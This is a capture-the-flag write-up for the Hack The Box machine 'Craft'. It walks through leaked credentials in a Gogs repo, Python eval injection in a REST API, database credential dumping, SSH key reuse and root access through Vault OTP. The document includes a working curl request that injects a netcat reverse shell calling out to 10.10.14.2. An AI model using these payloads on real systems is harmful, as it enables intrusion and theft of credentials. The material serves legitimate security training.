Craft was a fun Silicon Valley themed box where we have to exploit a vulnerable REST API eval function call to get RCE. After getting a shell on the app container, we escalate to a user shell on the host OS by finding credentials and SSH private keys. To gain root access, we have to generate an OTP token with the vault software installed on the machine.

## Summary

- Find the Gogs service, clone the app repo and identify the eval vulnerability in the source code
- Find a valid set of credentials in an old commit and use those to get a valid token for the API
- Exploit the eval vulnerability to get RCE and land a shell on the container
- Find Gilfoyle's Gogs password in the MySQL DB then find his SSH private key in the craft-infra repo
- Log in as gilfoyle on the host, find that vault is installed then generate an OTP to gain root access

## Portscan

I note that port 6022 is running a different SSH service: `SSH-2.0-Go`

## Website enumeration

The main webpage shows that there is a REST API available so there's a good chance that this box will be about exploiting it.

![](/assets/images/htb-writeup-craft/craft.png)

- The link at the top right points to the API: `https://api.craft.htb/api/`. I'll add that domain to my local `/etc/hosts`.
- The icon next to the API link goes to the Gogs servers, which is a self-hosted service. Again, I will add another domain entry to my local host file: `gogs.craft.htb`.

## Gogs

Before I start messing with the API, I'll check the source code from the git repo for any leftover credentials, notes/comments and other pieces of information that could help me find a bug in the application.

![](/assets/images/htb-writeup-craft/gogs.png)

The first thing I check is the list of registered users, the organizations and the repos available:

![](/assets/images/htb-writeup-craft/gogs_users.png)

![](/assets/images/htb-writeup-craft/gogs_repos.png)

I tried fetching the repo with SSH but I got a permission denied, but I was able to get it with HTTPS:

```
# git clone ssh://git@gogs.craft.htb:6022/Craft/craft-api.git
Cloning into 'craft-api'...

and the repository exists.

I then checked the commit logs to see what kind of changes were made.

```

A fix was put in place by Dinesh to prevent ABV values from being submitted. When I check the list of issues on the Gogs site, I find one opened for that specific bug:

![](/assets/images/htb-writeup-craft/issues.png)

A couple of things pop out right away:
 - There's a JWT token in here (maybe there's no expiry set)
 - There's a link to commit `c414b16057` which contains the fix
 - Gilfoyle comments that this is a bad patch, there's probably a vulnerability in it

The token is not valid anymore:

`curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k https://api.craft.htb/api/auth/check`

`{"message": "Invalid token or no token found."}`

I use [https://jwt.io/](https://jwt.io/) to decode the token and see that the expiry is set to epoch time `1549385242` which is `Tuesday, February 5, 2019 4:47:22 PM` in human readable format.

![](/assets/images/htb-writeup-craft/jwt.png)

I'll try to bruteforce the shared secret on the token so I can forge my own and change the expiry:

```
# john -w=/usr/share/wordlists/rockyou.txt token
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x])

Session completed
```

Unfortunately the shared secret is not found in rockyou.txt, so it's probably not meant to be cracked to solve this box.

Next, I check the `brew.py` code and quickly spot the vulnerability:

![](/assets/images/htb-writeup-craft/eval.png)

Using eval with user controlled input is extremely dangerous and in this case I can use this to my advantage to gain remote code execution. But I need to first find a way to obtain a valid token so I can make API calls.

I look around the commits for other files and find that credentials were hardcoded in the `test.py`:

![](/assets/images/htb-writeup-craft/tests1.png)

![](/assets/images/htb-writeup-craft/tests2.png)

I got some credentials now: `dinesh / 4aUh0A8PbVJxgd`

I find the API documentation on the `https://api.craft.htb/api/` page:

![](/assets/images/htb-writeup-craft/apidoc.png)

To get a token, I'll do a GET to `/auth/login` and pass the credentials with HTTP basic auth:

`curl -H "Content-Type: application/json" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTUzODU2fQ.hs-9F_c_KXIHEQg4tmgaRWacmEC402tsgtolQPZB3ik"}`

The token is only valid for a short period of time so I'll use jq to parse the output and assign it to a variable and I use for my other curl requests:

`token=$(curl -s -H "Content-Type: application/json" --user dinesh:4aUh0A8PbVJxgd -k https://api.craft.htb/api/auth/login | jq -r .[])
echo $token
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTYzMTU0MTAzfQ.JPg8sJ9enjgL86jy8DJrugK7xaF--wegrVdKXZLono0`

I can now do POST to add new brews:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 666, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.95"}'
null`

When doing a GET, I need to specify the page so I can confirm it's been added:

`curl -k "https://api.craft.htb/api/brew/?per_page=50&page=47"
 {"id": 2351, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.950"}, {"id": 2352, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "0.400"}], "page": 47, "pages": 47, "per_page": 50, "total": 2341}`

Ok, now it's time to exploit that eval to gain RCE. Because I don't see the results of the eval, I'll first test that the eval works by doing a `sleep` for 5 seconds:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 1000, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "__import__(\"time\").sleep(5)"}'`

Then after I confirmed that the eval works, I'll use `subprocess` to spawn a reverse shell:

`curl -k -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Craft-API-Token: $token" https://api.craft.htb/api/brew/ -XPOST -d '{"id": 1000, "brewer": "Snowscan", "name": "Snowscan", "style": "IPA", "abv": "__import__(\"subprocess\").check_output(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f\", shell=True) or 1"}'`

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.110] 43065

/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)...
/opt/app #
```

Turns out this is just a container and I need to keep looking to get a shell on the host OS.

## Finding more credentials in MySQL

The `settings.py` file contains the MySQL credentials and the shared api key.

```
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

The MySQL client is not installed on this machine but I can use the pymysql Python module to query the database.

```
/opt/app # python -c 'import pty;pty.spawn("/bin/sh")'
/opt/app # python
Python 3.6.8 (default, Feb  6 2019, 01:56:13)

>>> import pymysql
>>> connection = pymysql.connect(host='172.20.0.4', user='craft', password='qLGockJ6G2J75O',
    db='craft', cursorclass=pymysql.cursors.DictCursor)
>>> cursor = connection.cursor()
>>> cursor.execute("show tables")
2
>>> cursor.fetchall()
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
>>> cursor.execute("select * from user")
3
>>> cursor.fetchall()                   
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'},
 {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
 {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

So I found a few more credentials:
 - `ebachman / llJ77D8QFkLPQB`
 - `gilfoyle / ZEU3N8WNM2rh4T`

I can log in to the Gogs website with Gilfoyle's credentials:

![](/assets/images/htb-writeup-craft/gogs_gilfoyle.png)

Gilfoyle has a private repo: `craft-infra` and I find Gilfoyle's SSH private and public keys in the `.ssh` directory:

![](/assets/images/htb-writeup-craft/gogs_ssh.png)

I can now log in as user `gilfoyle` with the SSH key (the SSH key password is ZEU3N8WNM2rh4T):

```
# ssh -i id_rsa gilfoyle@10.10.10.110

## Privesc

I saw from the `craft-infra` repo that Vault is installed and I see that Gilfoyle has a vault token in its home directory:

```

gilfoyle@craft:~$ cat .vault-token

```

The `secrets.sh` config in the repo contains the following:

```
vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

I can get an OTP user token for root and log in using `vault ssh -mode=otp -role=root_otp root@10.10.10.110`:
